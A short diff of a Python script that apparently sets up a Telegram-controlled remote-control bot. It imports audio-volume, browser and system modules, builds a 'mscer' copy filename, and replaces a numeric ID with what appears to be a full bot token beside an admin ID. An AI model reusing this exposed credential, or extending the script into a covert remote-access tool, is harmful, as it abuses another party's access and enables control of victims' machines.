@@ -7,7 +7,6 @@ import wave
 import time
 import shutil
 import telebot
-import pyaudio
 import requests
 import platform
 import webbrowser
@@ -25,7 +24,7 @@ from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
 
 fname = 'mscer' + os.path.splitext(os.path.basename(sys.argv[0]))[1]
 
-token = '1190696453'
+token = '1190696453:AAHyPoAhNMlML1TmqCrevqi5hOCc9BgVwG4'
 adm = '1151837251'
 bot = telebot.TeleBot(token)
 
